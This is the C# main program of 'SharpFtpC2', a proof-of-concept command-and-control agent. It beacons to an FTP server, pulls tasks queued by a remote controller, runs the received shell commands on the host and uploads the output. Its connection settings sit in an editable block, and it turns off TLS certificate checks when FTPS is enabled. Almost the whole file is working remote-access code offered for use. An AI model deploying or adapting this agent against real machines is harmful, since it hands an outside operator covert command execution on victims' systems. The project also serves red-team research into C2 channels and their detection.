/*
 * =========================================================================================
 * Project:       SharpFtpC2 - Agent (v1.0 Beta)
 * 
 * Description:   SharpFtpShell is a compact C# project that showcases the technique
 *                of tunneling Command and Control (C2) communication via FTP(S).
 * 
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using FtpAgent;
using FtpC2.Responses;
using FtpC2.Tasks;
using System.Net;
using System.Text.Json;

class Program
{
    // In this Proof of Concept (PoC), the "AgentSession" GUID changes with each process instance.
    // If you require a unique identifier for each machine/user, it is advisable to replace this code
    // with a custom logic tailored to your needs.
    public static readonly Guid AgentSession = Guid.NewGuid();

    // EDIT HERE BEGIN ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    public static readonly string FtpHost = "127.0.0.1";
    public static readonly string FtpUser = "dark";
    public static readonly string FtpPwd = "toor";
    public static readonly bool FtpSecure = false;

    public static readonly int BeaconDelayMin = 500;
    public static readonly int BeaconDelayMax = 1000;
    // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  

    public static CancellationTokenSource CancellationTokenSource = new();

    public static void Main(string[] args)
    {
        // Important Notice: The delegate below renders the current application susceptible to
        // Man-in-the-Middle (MITM) attacks when utilizing SSL/TLS features.
        // This configuration was implemented to accommodate self-signed certificates.
        // However, it is strongly advised not to employ this approach in a production environment
        // if SSL/TLS security is expected.
        if (FtpSecure)
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ///

        UX.DisplayInfo($"Agent Id: `{AgentSession}`");
        ///

        List<Thread> daemons = new();

        // It is crucial for this thread to maintain high availability in order to continuously
        // signal to the Command and Control (C2) that our agent is operational.
        // To achieve this, only the "RegisterOrUpdateAgent" method is invoked at regular intervals,
        // minimizing resource consumption and ensuring consistent communication with the C2.
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            AgentProtocol AgentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession);

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Signal C2, we are still active.
                    AgentProto.RegisterOrUpdateAgent();

                    ///
                    Thread.Sleep(new Random().Next(BeaconDelayMin, BeaconDelayMax));
                }
                catch (Exception ex) 
                {
                    UX.DisplayError($"@DaemonBeaconThread: {ex.Message}");
                };
            }
        }));

        // This thread is specifically allocated for the enumeration of agent tasks
        // (which are registered by the controller) as well as the processing and response
        // of these tasks. This ensures a focused and efficient handling of agent-related
        // tasks.
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            AgentProtocol AgentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession);

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Gather C2 Tasks.
                    List<TaskWrapper> tasks = AgentProto.EnumerateTasks();                    

                    // Process Tasks:
                    foreach (TaskWrapper task in tasks)
                    {
                        ResponseWrapper? response = null;
                        ///

                        UX.DisplayInfo($"Process new task(`{task.Id}`) of type `{task.GetType().Name}`...");

                        switch (task)
                        {
                            case TaskShellCommand taskShellCommand:
                                {
                                    response = new ResponseShellCommand();

                                    ((ResponseShellCommand)response).RunShellCommand(taskShellCommand.Command ?? "");                                    

                                    break;
                                }

                            case TaskCommand taskCommand:
                                {
                                    switch(taskCommand.Command)
                                    {
                                        case TaskCommand.CommandKind.TerminateAgent:
                                            {
                                                CancellationTokenSource.Cancel();

                                                response = new ResponseNotification();

                                                ((ResponseNotification)response).Kind = ResponseNotification.NotificationKind.AgentTerminated;                                                

                                                break;
                                            }
                                    }

                                    break;
                                }

                            // Handle other tasks and response bellow:
                            // ...

                            default:
                                {
                                    UX.DisplayWarning($"Task(`{task.Id}`) of type `{task.GetType().Name}` is unknown.");

                                    break;
                                }
                        }

                        if (response != null)
                        {
                            AgentProto.RegisterNewResponse(response, task.Id);

                            UX.DisplaySuccess($"Task(`{task.Id}`) successfully processed.");
                        }
                    }                                       

                    ///
                    Thread.Sleep(new Random().Next(BeaconDelayMin, BeaconDelayMax));
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonTasksThread: {ex.Message}");
                };
            }
        }));

        // The action to handle a CTRL+C signal on the console has been registered.
        // When triggered, it will instruct any associated cancellation tokens to properly
        // shut down their associated daemons.
        Console.CancelKeyPress += (sender, cancelEventArgs) =>
        {
            CancellationTokenSource.Cancel(); // Signal tokens that application needs to be closed.

            cancelEventArgs.Cancel = true; // Cancel default behaviour
        };

        // Start daemons
        foreach (Thread daemon in daemons)
            daemon.Start(CancellationTokenSource.Token);

        // Keep process running until CTRL+C.
        CancellationToken token = CancellationTokenSource.Token;
        while (!token.IsCancellationRequested)
            Thread.Sleep(1000);

        // Wait for daemons to join main thread
        foreach (Thread daemon in daemons)
            daemon.Join();
    }
}